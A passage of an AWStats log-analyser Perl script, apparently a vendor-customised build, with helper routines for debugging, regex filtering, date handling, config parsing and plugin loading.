# Output:        None
# Return:        None
#------------------------------------------------------------------------------
sub warning
{
    my $messagestring = shift;
    if($WarningMessages){
        print "$messagestring\n";
    }
 }

#------------------------------------------------------------------------------
# Function:     Write debug message and exit
# Parameters:   $string $level
# Input:        %HTMLOutput  $Debug=required level  $DEBUGFORCED=required level forced
# Output:        None
# Return:        None
#------------------------------------------------------------------------------
sub debug
{
    my $level = $_[1] || 1;

    if(!$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE' }){
        http_head();
    } # To send the HTTP header and see debug
    if($level <= $DEBUGFORCED){
        my $debugstring = $_[0];
        if(!$DebugResetDone){
            open(DEBUGFORCEDFILE, "debug.log");
            close DEBUGFORCEDFILE;
            chmod 0666, "debug.log";
            $DebugResetDone = 1;
        }
        open(DEBUGFORCEDFILE, ">>debug.log");
        print DEBUGFORCEDFILE localtime(time) . 
            " - $$ - DEBUG $level - $debugstring\n";
        close DEBUGFORCEDFILE;
    }
    if($DebugMessages && $level <= $Debug){
        my $debugstring = $_[0];
        if(scalar keys %HTMLOutput){
            $debugstring =~ s/^ /&nbsp;&nbsp; /;
            $debugstring .= "<br />";
        }
        print localtime(time) . " - DEBUG $level - $debugstring\n";
    }
 }

#------------------------------------------------------------------------------
# Function:     Optimize an array removing duplicate entries
# Parameters:    @Array notcasesensitive=0|1
# Input:        None
# Output:        None
# Return:        None
#------------------------------------------------------------------------------
sub OptimizeArray
{
    my $array = shift;
    my @arrayunreg = map {if(/\(\?[-\w]*:(.*)\)/){$1}} @$array;
    my $notcasesensitive = shift;
    my $searchlist       = 0;
    while($searchlist > -1 && @arrayunreg){
        my $elemtoremove = -1;
        OPTIMIZELOOP:
        foreach my $i ($searchlist .. (scalar @arrayunreg) - 1){
            # Search if $i elem is already treated by another elem
            foreach my $j (0 .. (scalar @arrayunreg) - 1){
                if($i == $j){ next; }
                my $parami = $notcasesensitive ? lc($arrayunreg[$i]) : $arrayunreg[$i];
                my $paramj = $notcasesensitive ? lc($arrayunreg[$j]) : $arrayunreg[$j];
                if(index($parami, $paramj) > -1){
                    $elemtoremove = $i;
                    last OPTIMIZELOOP;
                }
            }
        }
        if($elemtoremove > -1){
            splice @arrayunreg, $elemtoremove, 1;
            $searchlist = $elemtoremove;
        }else{
            $searchlist = -1;
        }
    }
    if($notcasesensitive){
        return map {qr/$_/i} @arrayunreg;
    }
    return map {qr/$_/} @arrayunreg;
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipDNSLookupFor array
# Parameters:    ip @SkipDNSLookupFor (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipDNSLookup
{
    foreach (@SkipDNSLookupFor){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @SkipDNSLookupFor
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipHosts array
# Parameters:    host @SkipHosts (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipHost
{
    foreach (@SkipHosts){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @SkipHosts
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipReferrers array
# Parameters:    host @SkipReferrers (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipReferrer
{
    foreach (@SkipReferrers){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @SkipReferrers
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipUserAgents array
# Parameters:    useragent @SkipUserAgents (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipUserAgent
{
    foreach (@SkipUserAgents){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @SkipUserAgent
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipFiles array
# Parameters:    url @SkipFiles (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipFile
{
    foreach (@SkipFiles){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @SkipFiles
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyHosts array
# Parameters:    host @OnlyHosts (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyHost
{
    foreach (@OnlyHosts){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @OnlyHosts
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUsers array
# Parameters:    host @OnlyUsers (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUser
{
    foreach (@OnlyUsers){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @OnlyUsers
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUserAgents array
# Parameters:    useragent @OnlyUserAgents (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUserAgent
{
    foreach (@OnlyUserAgents){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @OnlyUserAgents
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in NotPageFiles array
# Parameters:    url @NotPageFiles (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub NotPageFile
{
    foreach (@NotPageFiles){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @NotPageFiles
 }

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyFiles array
# Parameters:    url @OnlyFiles (a NOT case sensitive precompiled regex array)
# Return:        0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyFile
{
    foreach (@OnlyFiles){
        if($_[0] =~ /$_/){
            return 1;
        }
    }
    0; # Not in @OnlyFiles
 }

#------------------------------------------------------------------------------
# Function:     Return day of week of a day
# Parameters:    $day $month $year
# Return:        0-6
#------------------------------------------------------------------------------
sub DayOfWeek
{
    my ($day, $month, $year) = @_;
    if($month < 3){
        $month += 10; $year--;
    }else{
        $month -= 2;
    }

    my $cent = sprintf("%1i", ($year / 100));
    my $y    = ($year % 100);
    my $dw   = (sprintf("%1i", (2.6 * $month) - 0.2) + $day + $y +
                sprintf("%1i", ($y / 4)) + sprintf("%1i", ($cent / 4)) -
               (2 * $cent)) % 7;
    $dw += 7 if($dw < 0);
    return $dw;
 }

#------------------------------------------------------------------------------
# Function:     Return 1 if a date exists
# Parameters:    $day $month $year
# Return:        1 if date exists else 0
#------------------------------------------------------------------------------
sub DateIsValid
{
    my ($day, $month, $year) = @_;
    if($day < 1)  { return 0; }
    if($day > 31){ return 0; }
    if($month == 4 || $month == 6 || $month == 9 || $month == 11){
        if($day > 30){ return 0; }
    }elsif($month == 2){
        my $leapyear = ($year % 4 == 0 ? 1 : 0); # A leap year every 4 years
        if($year % 100 == 0 && $year % 400 != 0){
            $leapyear = 0;
        } # Except if year is 100x and not 400x
        if($day > (28 + $leapyear)){
            return 0;
        }
    }
    return 1;
 }

#------------------------------------------------------------------------------
# Function:     Return string of visit duration
# Parameters:    $starttime $endtime
# Input:        None
# Output:        None
# Return:        A string that identify the visit duration range
#------------------------------------------------------------------------------
sub GetSessionRange
{
    my $starttime = my $endtime;
    if(shift =~ /$regdate/o){
        $starttime = Time::Local::timelocal($6, $5, $4, $3, $2 - 1, $1);
    }
    if(shift =~ /$regdate/o){
        $endtime = Time::Local::timelocal($6, $5, $4, $3, $2 - 1, $1);
    }
    my $delay = $endtime - $starttime;
    if($delay <= 30)   { return $SessionsRange[0]; }
    if($delay <= 120)  { return $SessionsRange[1]; }
    if($delay <= 300)  { return $SessionsRange[2]; }
    if($delay <= 900)  { return $SessionsRange[3]; }
    if($delay <= 1800) { return $SessionsRange[4]; }
    if($delay <= 3600) { return $SessionsRange[5]; }
    return $SessionsRange[6];
 }

#------------------------------------------------------------------------------
# Function:     Return string with just the extension of a file in the URL
# Parameters:    $regext, $url without query string
# Input:        None
# Output:        None
# Return:        A lowercase string with the name of the extension, e.g. "html"
#------------------------------------------------------------------------------
sub Get_Extension
{
    my $extension;
    my $regext = shift;
    my $urlwithnoquery = shift;
    if($urlwithnoquery =~ /$regext/o || 
       ($urlwithnoquery =~ /[\\\/]$/ && $DefaultFile[0] =~ /$regext/o)){
        $extension = ($LevelForFileTypesDetection >= 2 || $MimeHashLib{$1}) ? lc($1) : 'Unknown';
    }else{
        $extension = 'Unknown';
    }
    return $extension;
 }

#------------------------------------------------------------------------------
# Function:     Returns just the file of the url
# Parameters:    -
# Input:        $url
# Output:        String with the file name
# Return:        -
#------------------------------------------------------------------------------
sub Get_Filename{
    my $temp = shift;
    my $idx = -1;
    # check for slash
    $idx = rindex($temp, "/");
    if($idx > -1){ $temp = substr($temp, $idx+1); }
    else{ 
        $idx = rindex($temp, "\\");
        if($idx > -1){ $temp = substr($temp, $idx+1); }
    }
    return $temp;
 }

#------------------------------------------------------------------------------
# Function:     Compare two browsers version
# Parameters:    $a
# Input:        None
# Output:        None
# Return:        -1, 0, 1
#------------------------------------------------------------------------------
sub SortBrowsers {
    my $a_family = $a;
    my @a_ver    = ();
    foreach my $family (keys %BrowsersFamily){
        if($a =~ /^$family/i){
            $a =~ m/^(\D+)([\d\.]+)?$/;
            $a_family = $1;
            @a_ver = split(/\./, $2);
        }
    }
    my $b_family = $b;
    my @b_ver    = ();
    foreach my $family (keys %BrowsersFamily){
        if($b =~ /^$family/i){
            $b =~ m/^(\D+)([\d\.]+)?$/;
            $b_family = $1;
            @b_ver = split(/\./, $2);
        }
    }

    my $compare = 0;
    my $done    = 0;

    $compare = $a_family cmp $b_family;
    if($compare != 0){
        return $compare;
    }

    while (!$done){
        my $a_num = shift @a_ver || 0;
        my $b_num = shift @b_ver || 0;

        $compare = $a_num <=> $b_num;
        if($compare != 0
            || (scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0))
        {
            $done = 1;
        }
    }

    return $compare;
 }

#------------------------------------------------------------------------------
# Function: Read config file
# Input:    $DIR $PROG $SiteConfig
# Output:        Global variables
# Return:        -
#------------------------------------------------------------------------------
sub Read_Config
{
    # Check config file in common possible directories :
    # Windows : "$DIR" (same dir than awstats.pl)
    # Standard, Mandrake and Debian package :    "/etc/awstats"
    # Other possible directories : "/usr/local/bluedon/awstats/etc/"
    # Open config file
    my $ConfigDir = '/usr/local/bluedon/awstats/etc/';
    $FileConfig = $FileSuffix = '';
    if(open(CONFIG, "$ConfigDir$PROG.$SiteConfig.conf")){
        $FileConfig = "$ConfigDir$PROG.$SiteConfig.conf";
        $FileSuffix = ".$SiteConfig";
    }
    if(!$FileConfig){
        error("Couldn't open config file \"$PROG.$SiteConfig.conf\" ".
              "nor \"$PROG.conf\".Please read the documentation for ".
              "directories where the configuration file should be located.");
    }
    # Analyze config file content and close it
    &Parse_Config(*CONFIG, 1, $FileConfig);
    close CONFIG;

    # If parameter NotPageList not found, init for backward compatibility
    if(!$FoundNotPageList){
        %NotPageList = ('css' => 1, 'js'  => 1, 'class' => 1,
                        'gif' => 1, 'jpg' => 1, 'jpeg'  => 1,
                        'png' => 1, 'bmp' => 1, 'ico'   => 1,
                        'swf' => 1);
    }

    # If parameter ValidHTTPCodes empty, init for backward compatibility
    # If parameter ValidSMTPCodes empty, init for backward compatibility
    if(!scalar keys %ValidHTTPCodes){
        $ValidHTTPCodes{"200"} = $ValidHTTPCodes{"304"} = 1;
    }
    if(!scalar keys %ValidSMTPCodes){
        $ValidSMTPCodes{"1"} = $ValidSMTPCodes{"250"} = 1;
    }
 }

#------------------------------------------------------------------------------
# Function:     Parse content of a config file
# Parameters:    opened file handle, depth level, file name
# Input:        -
# Output:        Global variables
# Return:        -
#------------------------------------------------------------------------------
sub Parse_Config
{
    my ($confighandle) = $_[0];
    my $level          = $_[1];
    my $configFile     = $_[2];
    my $versionnum     = 0;
    my $conflinenb     = 0;

    if($level > 10){
        error("$PROG can't read down more than 10 level of includes.".
              "Check that no 'included' config files include their ".
              "parent config file (this cause infinite loop).");
    }
    while(<$confighandle>){
        chomp $_;
        s/\r//;
        $conflinenb++;

        # Extract version from first line
        if(!$versionnum && $_ =~ /^# AWSTATS CONFIGURE FILE (\d+).(\d+)/i){
            $versionnum = ($1 * 1000) + $2;
            next;
        }
        if($_ =~ /^\s*$/ || $_ =~ /^\s*#/)
        { # Remove comments
            next;
        }
        $_ =~ s/\s#.*$//;
        
        # Extract params and value
        # If not a params=value, try with next line
        my ($params, $value) = split(/=/, $_, 2);
        $params =~ s/^\s+|\s+$//g;
        if(!$params || !$value){
            warning("Warning: Syntax error line $conflinenb in file ".
                    "'$configFile'. Config line is ignored.");
            next;
        }

        # Initialize parameter for (params,value)
        $value =~ s/(^\s+)|(\s+$)//g;
        $value =~ s/^\"|\";?$//g;
        if($params =~ /^LogFile/){
            if($QueryString !~ /logfile=([^\s&]+)/i){
                $LogFile = $value;
            }
            next;
        }
        if($params =~ /^SiteDomain/){
            # No regex test as SiteDomain is always exact value
            $SiteDomain = $value;
            next;
        }
        if($params =~ /^HostAliases/){
            @HostAliases = ();
            foreach my $elem (split(/\s+/, $value)){
                if($elem =~ /^REGEX\[(.*)\]$/i){
                    $elem = $1;
                }else{
                    $elem = '^' . quotemeta($elem) . '$';
                }
                if($elem){
                    push @HostAliases, qr/$elem/i;
                }
            }
            next;
        }
        if($params =~ /^LoadPlugin/){
            push @PluginsToLoad, $value;
            next;
        }
        $$params = $value;
    }
 }

#------------------------------------------------------------------------------
# Function:     Check if all parameters are correctly defined. If not set them to default.
# Parameters:    None
# Input:        All global variables
# Output:        Change on some global variables
# Return:        None
#------------------------------------------------------------------------------
sub Check_Config
{
    # Main section
    $LogFile = &Substitute_Tags($LogFile);
    if(!$LogFile){
        error("LogFile parameter is not defined in config/domain file");
    }
    if($LogType !~ /[WSMF]/i){
        $LogType = 'W';
    }
    $LogFormat =~ s/\\//g;
    if(!$LogFormat){
        error("LogFormat parameter is not defined in config/domain file");
    }
    if($LogFormat =~ /^\d$/ && $LogFormat !~ /[1-6]/){
        error("LogFormat parameter is wrong in config/domain file. ".
              "Value is '$LogFormat' (should be 1,2,3,4,5 or a ".
              "'personalized AWStats log format string')");
    }

    $DirData      ||= '.';
    if($DNSLookup !~ /[0-2]/){
        error("DNSLookup parameter is wrong in config/domain file. ".
              "Value is '$DNSLookup' (should be 0,1 or 2)");
    }
    if(!$SiteDomain){
        error("SiteDomain parameter not defined in your config/domain file. ".
              "You must edit it for using this version of AWStats.");
    }
    $URLQuerySeparators =~ s/\s//g;
    if(!$URLQuerySeparators){
        $URLQuerySeparators   = '?;';
    }

    my @maxnboflist = ('Domain', 'HostsShown', 'LoginShown', 'RobotShown', 'WormsShown',
                       'PageShown','OsShown', 'BrowsersShown', 'ScreenSizesShown','RefererShown',
                       'KeyphrasesShown',  'KeywordsShown', 'EMailsShown', 'DownloadsShown');
    my @maxnboflistdefaultval = (10, 10, 10, 10, 5, 10, 10, 10, 5, 10, 10, 10, 20);
    foreach my $i (0 .. (@maxnboflist - 1)){
        if(!$MaxNbOf{$maxnboflist[$i]}
           || $MaxNbOf{$maxnboflist[$i]} !~ /^\d+$/
           || $MaxNbOf{$maxnboflist[$i]} < 1){
            $MaxNbOf{$maxnboflist[$i]} = $maxnboflistdefaultval[$i];
        }
    }

    my @minhitlist = ('Domain', 'Host', 'Login', 'Robot', 'Worm', 'File', 'Os', 'Browser',
                      'ScreenSize', 'Refer', 'Keyphrase', 'Keyword', 'EMail', 'Downloads');
    my @minhitlistdefaultval = (1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1);
    foreach my $i (0 .. (@minhitlist - 1)){
        if(!$MinHit{$minhitlist[$i]}
           || $MinHit{$minhitlist[$i]} !~ /^\d+$/
           || $MinHit{$minhitlist[$i]} < 1){
            $MinHit{$minhitlist[$i]} = $minhitlistdefaultval[$i];
        }
    }

    # Deny LogFile if contains a pipe and PurgeLogFile || ArchiveLogRecords set on
    if(($PurgeLogFile || $ArchiveLogRecords) && $LogFile =~ /\|\s*$/){
        error("A pipe in log file name is not allowed if PurgeLogFile ".
              "and ArchiveLogRecords are not set to 0");
    }
    # If not a migrate, check if DirData is OK
    if(!-d $DirData){
        if($CreateDirDataIfNotExists){
            my $mkdirok = mkdir "$DirData", 0766;
            if(!$mkdirok){
                error("$PROG failed to create directory DirData (DirData=\"$DirData\", ".
                      "CreateDirDataIfNotExists=$CreateDirDataIfNotExists).");
            }
        }else{
            error("AWStats database directory defined in config file by 'DirData' ".
                  "parameter ($DirData) does not exist or is not writable.");
        }
    }
    if($LogType eq 'S'){
        $NOTSORTEDRECORDTOLERANCE = 1000000;
    }
    $DefaultFile[0] ||= 'index.html';
 }

#------------------------------------------------------------------------------
# Function:     Load the reference databases
# Parameters:    List of files to load
# Input:        $DIR
# Output:        Arrays and Hash tables are defined
# Return:       -
#------------------------------------------------------------------------------
sub Read_Ref_Data
{
    # Check lib files in common possible directories :
    # Windows and standard package: "$DIR/lib" (lib in same dir than awstats.pl)
    # Debian package: "/usr/share/awstats/lib"
    my @PossibleLibDir = ("$DIR/lib", "/usr/local/bluedon/awstats/wwwroot/cgi-bin/lib" );
    my %FilePath       = ();
    my %DirAddedInINC  = ();
    my @FileListToLoad = ();
    while(my $file = shift){
        push @FileListToLoad, "$file.pm";
    }
    foreach my $file (@FileListToLoad){
        foreach my $dir (@PossibleLibDir){
            my $searchdir = $dir;
            if($searchdir && (!( $searchdir =~ /\/$/))
               && (!( $searchdir =~ /\\$/))){
                $searchdir .= "/";
            }
            if(!$FilePath{$file}){
                # To not load twice same file in different path
                if(-s "${searchdir}${file}"){
                    $FilePath{$file} = "${searchdir}${file}";
                    # Note: cygwin perl 5.8 need a push + require file
                    if(!$DirAddedInINC{"$dir"}){
                        push @INC, "$dir";
                        $DirAddedInINC{"$dir"} = 1;
                    }
                    my $loadret = require "$file";
                   #my $loadret=(require "$FilePath{$file}"||require "${file}");
                }
            }
        }
        if(!$FilePath{$file}){
            my $filetext = $file;
            $filetext =~ s/\.pm$//;
            $filetext =~ s/_/ /g;
            warning("Warning: Can't read file \"$file\" ($filetext detection ".
                    "will not work correctly).\nCheck if file is in \"" .
                    ($PossibleLibDir[0]) . "\" directory and is readable.");
        }
    }

    # Sanity check (if loaded)
    if((scalar keys %OSHashID) && @OSSearchIDOrder != scalar keys %OSHashID){
        error("Not same number of records of OSSearchIDOrder (" . 
              (@OSSearchIDOrder) . " entries) and OSHashID (" . 
              (scalar keys %OSHashID) . 
              " entries) in OS database. Check your file " . 
              $FilePath{"operating_systems.pm"});
    }
    if((scalar keys %SearchEnginesHashID) && 
       (@SearchEnginesSearchIDOrder_list1 +
       @SearchEnginesSearchIDOrder_list2 +
       @SearchEnginesSearchIDOrder_listgen ) != scalar
       keys %SearchEnginesHashID){
        error("Not same number of records of SearchEnginesSearchIDOrder_listx (total is " . 
              (@SearchEnginesSearchIDOrder_list1 +@SearchEnginesSearchIDOrder_list2 +
              @SearchEnginesSearchIDOrder_listgen) . " entries) and SearchEnginesHashID (" . 
              (scalar keys %SearchEnginesHashID) . " entries) in Search Engines database. ".
              "Check your file " . $FilePath{"search_engines.pm"} . " is up to date.");
    }
    if((scalar keys %BrowsersHashIDLib)&& @BrowsersSearchIDOrder != 
       ( scalar keys %BrowsersHashIDLib ) - 8 ){
        #foreach (sort keys %BrowsersHashIDLib){
        #    print $_."\n";
        #}
        #foreach (sort @BrowsersSearchIDOrder){
        #    print $_."\n";
        #}
        error("Not same number of records of BrowsersSearchIDOrder (" . 
              (@BrowsersSearchIDOrder) . " entries) and BrowsersHashIDLib (" . 
              ((scalar keys %BrowsersHashIDLib) - 8) . " entries without ".
              "firefox,opera,chrome,safari,konqueror,svn,msie,netscape) ".
              "in Browsers database. May be you updated AWStats without ".
              "updating browsers.pm file or you made changed into browsers.pm ".
              "not correctly. Check your file " . $FilePath{"browsers.pm"} . 
              " is up to date.");
    }
    if((scalar keys %RobotsHashIDLib) && (@RobotsSearchIDOrder_list1 + 
       @RobotsSearchIDOrder_list2 + @RobotsSearchIDOrder_listgen) != 
       (scalar keys %RobotsHashIDLib) - 1){
        error("Not same number of records of RobotsSearchIDOrder_listx (total is " . 
              (@RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
              @RobotsSearchIDOrder_listgen) . " entries) and RobotsHashIDLib (" . 
              ((scalar keys %RobotsHashIDLib ) - 1) . " entries without 'unknown') ".
              "in Robots database. Check your file " . $FilePath{"robots.pm"} . 
              " is up to date.");
    }
}

#------------------------------------------------------------------------------
# Function:     Substitute date tags in a string by value
# Parameters:    String
# Input:        All global variables
# Output:        Change on some global variables
# Return:        String
#------------------------------------------------------------------------------
sub Substitute_Tags
{
    my $SourceString = shift;
    my %MonthNumLibEn = ("01", "Jan", "02", "Feb", "03", "Mar", "04", "Apr",
                             "05", "May", "06", "Jun", "07", "Jul", "08", "Aug",
                             "09", "Sep", "10", "Oct", "11", "Nov", "12", "Dec");
    while($SourceString =~ /%([ymdhwYMDHWNSO]+)-(\(\d+\)|\d+)/){
        # Accept tag %xx-dd and %xx-(dd)
        my $timetag     = "$1";
        my $timephase   = quotemeta("$2");
        my $timephasenb = "$2";
        $timephasenb =~ s/[^\d]//g;

        # Get older time
        my ($oldersec,   $oldermin,  $olderhour, $olderday,
                  $oldermonth, $olderyear, $olderwday, $olderyday) = 
                  localtime($starttime - ($timephasenb * 3600));
        my $olderweekofmonth = int($olderday / 7);
        my $olderweekofyear  = int(($olderyday - 1 + 6 - ($olderwday == 0 ? 6 : $olderwday - 1)) / 7) + 1;
        if($olderweekofyear > 53){
            $olderweekofyear = 1;
        }
        
        my $olderdaymod = $olderday % 7;
        $olderwday++;
        my $olderns = Time::Local::timegm(0, 0, 0, $olderday, $oldermonth, $olderyear);
        if($olderdaymod <= $olderwday){
            if(($olderwday != 7) || ($olderdaymod != 0)){
                $olderweekofmonth = $olderweekofmonth + 1;
            }
        }
        if($olderdaymod > $olderwday){
            $olderweekofmonth = $olderweekofmonth + 2;
        }

        # Change format of time variables
        $olderweekofmonth = "0$olderweekofmonth";
        if($olderweekofyear < 10){
            $olderweekofyear = "0$olderweekofyear";
        }
        if($olderyear < 100){ $olderyear += 2000; }
        else { $olderyear += 1900; }
        my $oldersmallyear = $olderyear;
        $oldersmallyear =~ s/^..//;
        if(++$oldermonth < 10){ $oldermonth = "0$oldermonth"; }
        if($olderday < 10)     { $olderday   = "0$olderday"; }
        if($olderhour < 10)    { $olderhour  = "0$olderhour"; }
        if($oldermin < 10)     { $oldermin   = "0$oldermin"; }
        if($oldersec < 10)     { $oldersec   = "0$oldersec"; }

        # Replace tag with new value
        if($timetag eq 'YYYY'){
            $SourceString =~ s/%YYYY-$timephase/$olderyear/ig;
            next;
        }
        if($timetag eq 'YY'){
            $SourceString =~ s/%YY-$timephase/$oldersmallyear/ig;
            next;
        }
        if($timetag eq 'MM'){
            $SourceString =~ s/%MM-$timephase/$oldermonth/ig;
            next;
        }
        if($timetag eq 'MO'){
            $SourceString =~ s/%MO-$timephase/$MonthNumLibEn{$oldermonth}/ig;
            next;
        }
        if($timetag eq 'DD'){
            $SourceString =~ s/%DD-$timephase/$olderday/ig;
            next;
        }
        if($timetag eq 'HH'){
            $SourceString =~ s/%HH-$timephase/$olderhour/ig;
            next;
        }
        if($timetag eq 'NS'){
            $SourceString =~ s/%NS-$timephase/$olderns/ig;
            next;
        }
        if($timetag eq 'WM'){
            $SourceString =~ s/%WM-$timephase/$olderweekofmonth/g;
            next;
        }
        if($timetag eq 'Wm'){
            my $olderweekofmonth0 = $olderweekofmonth - 1;
            $SourceString =~ s/%Wm-$timephase/$olderweekofmonth0/g;
            next;
        }
        if($timetag eq 'WY'){
            $SourceString =~ s/%WY-$timephase/$olderweekofyear/g;
            next;
        }
        if($timetag eq 'Wy'){
            my $olderweekofyear0 = sprintf("%02d", $olderweekofyear - 1);
            $SourceString =~ s/%Wy-$timephase/$olderweekofyear0/g;
            next;
        }
        if($timetag eq 'DW'){
            $SourceString =~ s/%DW-$timephase/$olderwday/g;
            next;
        }
        if($timetag eq 'Dw'){
            my $olderwday0 = $olderwday - 1;
            $SourceString =~ s/%Dw-$timephase/$olderwday0/g;
            next;
        }
        # If unknown tag
        error("Unknown tag '\%$timetag' in parameter.");
    }

    # Replace %YYYY %YY %MM %DD %HH with current value. Kept for backward compatibility.
    $SourceString =~ s/%YYYY/$nowyear/ig;
    $SourceString =~ s/%YY/$nowsmallyear/ig;
    $SourceString =~ s/%MM/$nowmonth/ig;
    $SourceString =~ s/%MO/$MonthNumLibEn{$nowmonth}/ig;
    $SourceString =~ s/%DD/$nowday/ig;
    $SourceString =~ s/%HH/$nowhour/ig;
    $SourceString =~ s/%NS/$nowns/ig;
    $SourceString =~ s/%WM/$nowweekofmonth/g;
    my $nowweekofmonth0 = $nowweekofmonth - 1;
    $SourceString =~ s/%Wm/$nowweekofmonth0/g;
    $SourceString =~ s/%WY/$nowweekofyear/g;
    my $nowweekofyear0 = $nowweekofyear - 1;
    $SourceString =~ s/%Wy/$nowweekofyear0/g;
    $SourceString =~ s/%DW/$nowwday/g;
    my $nowwday0  = $nowwday - 1;
    $SourceString =~ s/%Dw/$nowwday0/g;

    return $SourceString;
}

#------------------------------------------------------------------------------
# Function:     Common function used by init function of plugins
# Parameters:    AWStats version required by plugin
# Input:        $VERSION
# Output:        None
# Return:         '' if ok, "Error: xxx" if error
#------------------------------------------------------------------------------
sub Check_Plugin_Version {
    my $PluginNeedAWStatsVersion = shift;
    if(!$PluginNeedAWStatsVersion){ return 0; }
    $VERSION =~ /^(\d+)\.(\d+)/;
    my $numAWStatsVersion = ($1 * 1000) + $2;
    $PluginNeedAWStatsVersion =~ /^(\d+)\.(\d+)/;
    my $numPluginNeedAWStatsVersion = ($1 * 1000) + $2;
    if($numPluginNeedAWStatsVersion > $numAWStatsVersion){
        return
"Error: AWStats version $PluginNeedAWStatsVersion or higher is required. Detected $VERSION.";
    }
    return '';
 }

#------------------------------------------------------------------------------
# Function:     Return a checksum for an array of string
# Parameters:    Array of string
# Input:        None
# Output:        None
# Return:         Checksum number
#------------------------------------------------------------------------------
sub CheckSum {
    my $string   = shift;
    my $checksum = 0;

    #    use MD5;
    #     $checksum = MD5->hexhash($string);
    my $i = 0;
    my $j = 0;
    while ($i < length($string)){
        my $c = substr($string, $i, 1);
        $checksum += (ord($c) << (8 * $j));
        if($j++ > 3){ $j = 0; }
        $i++;
    }
    return $checksum;
 }

#------------------------------------------------------------------------------
# Function:     Load plugins files
# Parameters:    None
# Input:        $DIR @PluginsToLoad
# Output:        None
# Return:         None
#------------------------------------------------------------------------------
sub Read_Plugins
{
    # Check plugin files in common possible directories :
    # Windows and standard package: "$DIR/plugins"
    # (plugins in same dir than awstats.pl)
    # Redhat : "/usr/local/awstats/wwwroot/cgi-bin/plugins"
    # Debian package : "/usr/share/awstats/plugins"
    my @PossiblePluginsDir = (
        "$DIR/plugins",
        "/usr/local/awstats/wwwroot/cgi-bin/plugins",
        "/usr/share/awstats/plugins");
    my %DirAddedInINC = ();

    # Removed for security reason
    # foreach my $key (keys %NoLoadPlugin){
    #     if($NoLoadPlugin{$key} < 0){
    #         push @PluginsToLoad, $key;
    #     }
    # }
    foreach my $plugininfo (@PluginsToLoad){
        my ($pluginfile, $pluginparam) = split(/\s+/, $plugininfo, 2);
        # If split has only on part, pluginparam is not initialized
        $pluginparam ||= "";
        $pluginfile =~ s/\.pm$//i;
        $pluginfile =~ /([^\/\\]+)$/;
        # pluginfile is cleaned from any path for security reasons and from .pm
        $pluginfile = Sanitize($1);
        my $pluginname = $pluginfile;
        if($NoLoadPlugin{$pluginname} && $NoLoadPlugin{$pluginname} > 0){
            next;
        }
        if($pluginname){
            if(!$PluginsLoaded{'init'}{"$pluginname"}){
                # Plugin not already loaded
                my %pluginisfor = (
                    'timehires'            => 'u',
                    'ipv6'                 => 'u',
                    'hashfiles'            => 'u',
                    'geoipfree'            => 'u',
                    'geoip'                => 'ou',
                    'geoip_region_maxmind' => 'mou',
                    'geoip_city_maxmind'   => 'mou',
                    'geoip_isp_maxmind'    => 'mou',
                    'geoip_org_maxmind'    => 'mou',
                    'timezone'             => 'ou',
                    'decodeutfkeys'        => 'o',
                    'hostinfo'             => 'o',
                    'rawlog'               => 'o',
                    'userinfo'             => 'o',
                    'urlalias'             => 'o',
                    'tooltips'             => 'o');
                if($pluginisfor{$pluginname}){
                    # If it's a known plugin, may be we don't need to load it
                    # Do not load "menu handler plugins" if output only and mainleft frame
                    # Do not load "output plugins" if update only
                    if($UpdateStats && $pluginisfor{$pluginname } !~ /u/){
                        $PluginsLoaded{'init'}{"$pluginname"} = 1;
                        next;
                    }
                }

                # Load plugin
                foreach my $dir (@PossiblePluginsDir){
                    my $searchdir = $dir;
                    if($searchdir && (!($searchdir =~ /\/$/)) && (!($searchdir =~ /\\$/))){
                        $searchdir .= "/";
                    }
                    my $pluginpath = "${searchdir}${pluginfile }.pm";
                    if(-s "$pluginpath"){
                        $PluginDir = "${searchdir}"; # Set plugin dir
                        if(!$DirAddedInINC{"$dir"}){
                            push @INC, "$dir";
                            $DirAddedInINC{"$dir"} = 1;
                        }
                        my $loadret = 0;
                        my $modperl = $ENV{"MOD_PERL"} ? 
                            eval {require mod_perl;$mod_perl::VERSION >= 1.99 ? 2 : 1;} : 0;
                        if($modperl == 2){
                            $loadret = require "$pluginpath";
                        }else{
                            $loadret = require "$pluginfile.pm";
                        }
